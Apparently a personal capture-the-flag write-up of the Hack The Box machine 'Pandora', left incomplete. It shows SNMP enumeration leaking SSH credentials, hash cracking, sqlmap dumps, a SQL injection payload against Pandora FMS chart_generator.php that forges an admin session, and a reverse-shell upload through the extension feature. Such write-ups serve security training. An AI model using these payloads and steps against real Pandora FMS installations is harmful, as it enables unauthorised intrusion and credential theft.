# Pandora

# Enumeration

portscan 

```bash
[+] 10.129.127.45:        - 10.129.127.45:22 - TCP OPEN
[+] 10.129.127.45:        - 10.129.127.45:80 - TCP OPEN

kali@kali  ~/htb/pandora  sudo nmap -sU -p- --min-rate 5000 10.129.127.45 -oN portscan-udp 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 20:54 EST
Warning: 10.129.127.45 giving up on port because retransmission cap hit (10).
Nmap scan report for pandora.htb (10.129.127.45)
Host is up (0.21s latency).
Not shown: 65383 open|filtered udp ports (no-response), 151 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 146.15 seconds
```

- this may be a vhost

![pandora-possible-vhost.png](Pandora%203c53185947e748c08a1e5ad400b89c8e/pandora-possible-vhost.png)

- nothing different on panda.htb
- enumerating snmp

```python
kali@kali  ~/htb/pandora  snmpwalk -c public -v1 pandora.htb
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (143604) 0:23:56.04
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
```

- using metasploit snmp_enum module to enumerate port 161
- apparently, it doesn’t matter if it’s closed

```python
707                 runnable            vmtoolsd            /usr/bin/vmtoolsd
716                 runnable            dhclient            /sbin/dhclient      -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
729                 runnable            accounts-daemon     /usr/lib/accountsservice/accounts-daemon
730                 runnable            dbus-daemon         /usr/bin/dbus-daemon--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
736                 runnable            irqbalance          /usr/sbin/irqbalance--foreground
738                 runnable            networkd-dispat     /usr/bin/python3    /usr/bin/networkd-dispatcher --run-startup-triggers
739                 runnable            rsyslogd            /usr/sbin/rsyslogd  -n -iNONE
740                 runnable            systemd-logind      /lib/systemd/systemd-logind
743                 runnable            udisksd             /usr/lib/udisks2/udisksd
757                 unknown             kworker/1:4-events
790                 runnable            polkitd             /usr/lib/policykit-1/polkitd--no-debug
888                 runnable            systemd-resolve     /lib/systemd/systemd-resolved
960                 runnable            cron                /usr/sbin/cron      -f
971                 runnable            atd                 /usr/sbin/atd       -f
972                 runnable            cron                /usr/sbin/CRON      -f
973                 running             snmpd               /usr/sbin/snmpd     -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid
975                 runnable            sh                  /bin/sh             -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
987                 runnable            sshd                sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
989                 runnable            agetty              /sbin/agetty        -o -p -- \u --noclear tty1 linux
1017                runnable            apache2             /usr/sbin/apache2   -k start
1041                runnable            mysqld              /usr/sbin/mysqld
1042                runnable            apache2             /usr/sbin/apache2   -k start
1043                runnable            apache2             /usr/sbin/apache2   -k start
1044                runnable            apache2             /usr/sbin/apache2   -k start
1045                runnable            apache2             /usr/sbin/apache2   -k start
1046                runnable            apache2             /usr/sbin/apache2   -k start
1124                runnable            host_check          /usr/bin/host_check -u daniel -p HotelBabylon23
1129                runnable            apache2             /usr/sbin/apache2   -k start
```

- Found the creds for ssh

# Initial Access

- ssh creds found in results of snmp_module
- found an additional directory

```python
daniel@pandora:/var/www/pandora$ ls -al
total 16
drwxr-xr-x  3 matt matt 4096 Dec  7 14:32 .
drwxr-xr-x  4 root root 4096 Dec  7 14:32 ..
-rw-r--r--  1 matt matt   63 Jun 11  2021 index.html
drwxr-xr-x 16 matt matt 4096 Dec  7 14:32 pandora_console
```

- it’s probably an endpoint on web server

```python
daniel@pandora:/var/www/pandora/pandora_console$ cat pandora_console_logrotate_centos
# Centos, Redhat, Fedora
/var/www/html/pandora_console/pandora_console.log {
        weekly
        missingok
        size 100000
        rotate 3
        maxage 15
        compress
        notifempty
        create 644 apache root
}
```

- found pandoradb_data.sql
- found admin creds

![pandora-admin-sql-creds.png](Pandora%203c53185947e748c08a1e5ad400b89c8e/pandora-admin-sql-creds.png)

```python
admin:1da7ee7d45b96d0e1f45ee4ee23da560 -> decrypts to 'pandora'
```

- forwarding port 80 to get access to /pandora_console/

```python
ssh -L daniel@pandora.htb 8080:127.0.0.1:80
```

```python
: ${PANDORA_DB_PASSWORD:=$MYSQL_ENV_MYSQL_PASSWORD}
if [ -z "$PANDORA_DB_NAME" ]; then
        : ${PANDORA_DB_NAME:=${MYSQL_ENV_MYSQL_DATABASE:-pandora}}
fi

if [ -z "$PANDORA_DB_PASSWORD" ]; then
        echo >&2 'error: missing required PANDORA_DB_PASSWORD environment variable'
        echo >&2 '  Did you forget to -e PANDORA_DB_PASSWORD=... ?'
        echo >&2
        echo >&2 '  (Also of interest might be PANDORA_DB_USER and PANDORA_DB_NAME.)'
        exit 1
fi

mv -f /tmp/pandorafms/pandora_console /var/www/html
cd /var/www/html/pandora_console/include
cat > config.php <<- 'EOF'
<?php
$config["dbtype"] = "mysql";
$config["homedir"]="/var/www/html/pandora_console";             // Config homedir
$config["homeurl"]="/pandora_console";                  // Base URL
$config["homeurl_static"]="/pandora_console";                   // Don't  delete
error_reporting(E_ALL);
$ownDir = dirname(__FILE__) . DIRECTORY_SEPARATOR;
EOF

echo "\$config[\"dbname\"]=\"$PANDORA_DB_NAME\";" >> config.php
echo "\$config[\"dbuser\"]=\"$PANDORA_DB_USER\";" >> config.php
echo "\$config[\"dbpass\"]=\"$PANDORA_DB_PASSWORD\";" >> config.php
echo "\$config[\"dbhost\"]=\"$PANDORA_DB_HOST\";" >> config.php
echo "include (\$ownDir . \"config_process.php\");" >> config.php
echo "?>" >> config.php
```

- Creation of config files

# Privilege Escalation

- When we enter daniel’s creds in the login page we get an interesting popup saying daniel can only access the api
- include/api.php allows us to call functions using certain parameters

```python
// Get the parameters and parse if necesary.
$op = get_parameter('op');
$op2 = get_parameter('op2');
$ext_name = get_parameter('ext_name');
$ext_function = get_parameter('ext_function');
$id = get_parameter('id');
$id2 = get_parameter('id2');
$otherSerialize = get_parameter('other');
$otherMode = get_parameter('other_mode', 'url_encode');
$returnType = get_parameter('return_type', 'string');
$api_password = get_parameter('apipass', '');
$password = get_parameter('pass', '');
$user = get_parameter('user', '');
$info = get_parameter('info', '');

$other = parseOtherParameter($otherSerialize, $otherMode);

$other = parseOtherParameter($otherSerialize, $otherMode);
$apiPassword = io_output_password(
    db_get_value_filter(
        'value',
.
.
.
.
// Check if the function exists.
        if (function_exists($function_name)) {
            if (!DEBUG) {
                error_reporting(0);
            }

            if (VERBOSE) {
                error_reporting(E_ALL);
                ini_set('display_errors', 1);
            }

            call_user_func(
                $function_name,
                $id,
                $id2,
                $other,
                $returnType,
                $user_in_db
            );
        } else {
            returnError('no_exist_operation', $returnType);
        }
```

- Found matt’s password

![found-matt-password.png](Pandora%203c53185947e748c08a1e5ad400b89c8e/found-matt-password.png)

```python
Matt;;;-1;f655f807365b6dc602b31ab3d6d43acc
```

- couldn’t crack that hash
- Trying the preferred method

[Pandora FMS 742: Critical Code Vulnerabilities Explained](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained)

- it essentially says that there’s a url param ‘session_id’ in include/chart_generator.php that is vulnerable to SQL Injection
- dumped tables using sqlmap

```python
# sqlmap --url http://localhost:8090/pandora_console/include/chart_generator.php?session_id=somesession

[78 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| CLIENT_STATISTICS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GEOMETRY_COLUMNS                      |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INDEX_STATISTICS                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_MUTEXES                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_DATAFILES                  |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_SEMAPHORE_WAITS            |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TABLESPACES_ENCRYPTION         |
| INNODB_TABLESPACES_SCRUBBING          |
| INNODB_TRX                            |
| KEYWORDS                              |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| SPATIAL_REF_SYS                       |
| SQL_FUNCTIONS                         |
| STATISTICS                            |
| SYSTEM_VARIABLES                      |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TABLE_STATISTICS                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| USER_STATISTICS                       |
| VIEWS                                 |
| user_variables                        |
+---------------------------------------+

Database: pandora
[178 tables]
+---------------------------------------+
| taddress                              |
| taddress_agent                        |
| tagent_access                         |
| tagent_custom_data                    |
| tagent_custom_fields                  |
| tagent_custom_fields_filter           |
| tagent_module_inventory               |
| tagent_module_log                     |
| tagent_repository                     |
| tagent_secondary_group                |
| tagente                               |
| tagente_datos                         |
| tagente_datos_inc                     |
| tagente_datos_inventory               |
| tagente_datos_log4x                   |
| tagente_datos_string                  |
| tagente_estado                        |
| tagente_modulo                        |
| talert_actions                        |
| talert_commands                       |
| talert_snmp                           |
| talert_snmp_action                    |
| talert_special_days                   |
| talert_template_module_actions        |
| talert_template_modules               |
| talert_templates                      |
| tattachment                           |
| tautoconfig                           |
| tautoconfig_actions                   |
| tautoconfig_rules                     |
| tcategory                             |
| tcluster                              |
| tcluster_agent                        |
| tcluster_item                         |
| tcollection                           |
| tconfig                               |
| tconfig_os                            |
| tcontainer                            |
| tcontainer_item                       |
| tcredential_store                     |
| tdashboard                            |
| tdatabase                             |
| tdeployment_hosts                     |
| tevent_alert                          |
| tevent_alert_action                   |
| tevent_custom_field                   |
| tevent_extended                       |
| tevent_filter                         |
| tevent_response                       |
| tevent_rule                           |
| tevento                               |
| textension_translate_string           |
| tfiles_repo                           |
| tfiles_repo_group                     |
| tgis_data_history                     |
| tgis_data_status                      |
| tgis_map                              |
| tgis_map_connection                   |
| tgis_map_has_tgis_map_con             |
| tgis_map_layer                        |
| tgis_map_layer_groups                 |
| tgis_map_layer_has_tagente            |
| tgraph                                |
| tgraph_source                         |
| tgraph_source_template                |
| tgraph_template                       |
| tgroup_stat                           |
| tgrupo                                |
| tincidencia                           |
| titem                                 |
| tlanguage                             |
| tlayout                               |
| tlayout_data                          |
| tlayout_template                      |
| tlayout_template_data                 |
| tlink                                 |
| tlocal_component                      |
| tlog_graph_models                     |
| tmap                                  |
| tmensajes                             |
| tmetaconsole_agent                    |
| tmetaconsole_agent_secondary_group    |
| tmetaconsole_event                    |
| tmetaconsole_event_history            |
| tmetaconsole_setup                    |
| tmigration_module_queue               |
| tmigration_queue                      |
| tmodule                               |
| tmodule_group                         |
| tmodule_inventory                     |
| tmodule_relationship                  |
| tmodule_synth                         |
| tnetflow_filter                       |
| tnetflow_report                       |
| tnetflow_report_content               |
| tnetwork_component                    |
| tnetwork_component_group              |
| tnetwork_map                          |
| tnetwork_matrix                       |
| tnetwork_profile                      |
| tnetwork_profile_component            |
| tnetworkmap_ent_rel_nodes             |
| tnetworkmap_enterprise                |
| tnetworkmap_enterprise_nodes          |
| tnews                                 |
| tnota                                 |
| tnotification_group                   |
| tnotification_source                  |
| tnotification_source_group            |
| tnotification_source_group_user       |
| tnotification_source_user             |
| tnotification_user                    |
| torigen                               |
| tpassword_history                     |
| tperfil                               |
| tphase                                |
| tplanned_downtime                     |
| tplanned_downtime_agents              |
| tplanned_downtime_modules             |
| tplugin                               |
| tpolicies                             |
| tpolicy_agents                        |
| tpolicy_alerts                        |
| tpolicy_alerts_actions                |
| tpolicy_collections                   |
| tpolicy_groups                        |
| tpolicy_modules                       |
| tpolicy_modules_inventory             |
| tpolicy_plugins                       |
| tpolicy_queue                         |
| tprofile_view                         |
| tprovisioning                         |
| tprovisioning_rules                   |
| trecon_script                         |
| trecon_task                           |
| trel_item                             |
| tremote_command                       |
| tremote_command_target                |
| treport                               |
| treport_content                       |
| treport_content_item                  |
| treport_content_item_temp             |
| treport_content_sla_com_temp          |
| treport_content_sla_combined          |
| treport_content_template              |
| treport_custom_sql                    |
| treport_template                      |
| treset_pass                           |
| treset_pass_history                   |
| tserver                               |
| tserver_export                        |
| tserver_export_data                   |
| tservice                              |
| tservice_element                      |
| tsesion                               |
| tsesion_extended                      |
| tsessions_php                         |
| tskin                                 |
| tsnmp_filter                          |
| ttag                                  |
| ttag_module                           |
| ttag_policy_module                    |
| ttipo_modulo                          |
| ttransaction                          |
| ttrap                                 |
| ttrap_custom_values                   |
| tupdate                               |
| tupdate_journal                       |
| tupdate_package                       |
| tupdate_settings                      |
| tuser_double_auth                     |
| tuser_task                            |
| tuser_task_scheduled                  |
| tusuario                              |
| tusuario_perfil                       |
| tvisual_console_elements_cache        |
| twidget                               |
| twidget_dashboard                     |
+---------------------------------------+
```

```python
| 2g3kvg43qs70i45kltpi5p02kt       | NULL                                                 | 1641726764  |
| 31nj681ea803les8ndn97mnsoa       | NULL                                                 | 1641741326  |
| 346uqacafar8pipuppubqet7ut       | id_usuario|s:6:"daniel";                             | 1638540332  |
| 3me2jjab4atfa5f8106iklh4fc       | NULL                                                 | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02       | NULL                                                 | 1638786842  |
| 4hi02ceckcj930tvo6stq5qsri       | NULL                                                 | 1641741128  |
| 4nsbidcmgfoh1gilpv8p5hpi2s       | id_usuario|s:6:"daniel";                             | 1638535373  |
| 59qae699l0971h13qmbpqahlls       | NULL                                                 | 1638787305  |
| 5ckl3ojcsnb417q1t831tfn7s2       | NULL                                                 | 1641716260  |
| 5fihkihbip2jioll1a8mcsmp6j       | NULL                                                 | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air       | id_usuario|s:6:"daniel";                             | 1638281946  |
| 61roic0l96tpq16l0751nq7c19       | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0; | 1641728302  |
| 69gbnjrc2q42e8aqahb1l2s68n       | id_usuario|s:6:"daniel";                             | 1641195617  |
| 6ebq4pnfdsbsjc2racgam2ttu1       | NULL                                                 | 1641740537  |
| 6jgug0ob8nk7e9aecf3bu438qf       | id_usuario|s:6:"daniel";                             | 1641727317  |
| 721l7ssa5ae1n23q0qkmkkef8o       | NULL                                                 | 1641728494  |
| 81697c39dao4cpab61vg25oor4       | id_usuario|s:6:"daniel";                             | 1641728609  |
| 81f3uet7p3esgiq02d4cjj48rc       | NULL                                                 | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre       | id_usuario|s:6:"daniel";                             | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd       | NULL                                                 | 1638787267  |
| 9j73esd5dt7n1cplt5jrin1u1m       | NULL                                                 | 1641715266  |
| 9vv4godmdam3vsq8pu78b52em9       | id_usuario|s:6:"daniel";                             | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80       | NULL                                                 | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f       | id_usuario|s:6:"daniel";                             | 1638881664  |
| ata00v7uv07q4nsttotn86ch0k       | NULL                                                 | 1641721139  |
| bbhf4mtod74tqhv50mpdvu4lj5       | id_usuario|s:6:"daniel";                             | 1641201982  |
| bk2nkh2p7l6vrtqr3vokl0h50r       | NULL                                                 | 1641716359  |
| bs882k03675lbkq9dpu0ktvgtv       | NULL                                                 | 1641713901  |
| c2vcecp02v4u2uq4ndq9v530hh       | NULL
```

- using the sql injection in chart_generator.php somehow update the admin session_id

```python
http://localhost:8090/include/chart_generator.php?session_id=sessionid' UNION SELECT 'aboslutelyanything',123412341234,'id_usuario|s:5:"admin";';-- -
```

- then copy the cookie present in the network tab and use that on /pandora_console/index.php to gain access to dashboard
- admin tools → upload extension

```python
zip safe_extension.zip php-reverse-shell.php
```

- then simply head over to /extensions/php-reverse-shell.php, payload will execute getting us a reverse shell

```python
matt@pandora:/var/www/pandora/pandora_console/include$ cat config.php
<?php
// File generated by centos kickstart
$config["dbtype"] = "mysql";
$config["dbname"]="pandora";
$config["dbuser"]="pandora";
$config["dbpass"]="PandoraFMSSecurePass2021";
$config["dbhost"]="localhost";
$config["homedir"]="/var/www/pandora/pandora_console";
$config["homeurl"]="/pandora_console";
error_reporting(0);
$ownDir = dirname(__FILE__) . '/';
include ($ownDir . "config_process.php");
?>
```

- add an ssh key for user matt
- 

## Notes

-